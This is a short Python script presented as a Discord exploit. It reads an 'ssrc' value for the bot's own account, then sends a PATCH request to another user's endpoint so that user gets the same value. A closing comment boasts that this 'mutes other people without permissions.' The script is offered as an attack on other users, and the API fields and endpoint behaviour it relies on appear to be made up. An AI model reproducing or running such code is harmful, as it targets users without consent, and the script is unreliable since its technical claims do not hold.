import requests

# Replace these values with your own Discord API token and the user ID of the user you want to switch SSRC with
TOKEN = "your_api_token"
USER_ID = "user_id"

# Get the current user's SSRC
headers = {
    "Authorization": f"Bot {TOKEN}",
    "User-Agent": "MyBot/1.0",
}
response = requests.get("https://discordapp.com/api/v6/users/@me", headers=headers)
user_data = response.json()
current_ssrc = user_data["ssrc"]

# Update the other user's SSRC to be the same as the current user's SSRC
headers = {
    "Authorization": f"Bot {TOKEN}",
    "User-Agent": "MyBot/1.0",
    "Content-Type": "application/json",
}
data = {"ssrc": current_ssrc}
response = requests.patch(f"https://discordapp.com/api/v6/users/{USER_ID}", headers=headers, json=data)

# Check the response status code to see if the update was successful
if response.status_code == 200:
    print("Successfully updated SSRC for user with ID", USER_ID)
else:
    print("Error updating SSRC for user with ID", USER_ID)
    
# This exploit mutes other people without permissions :)



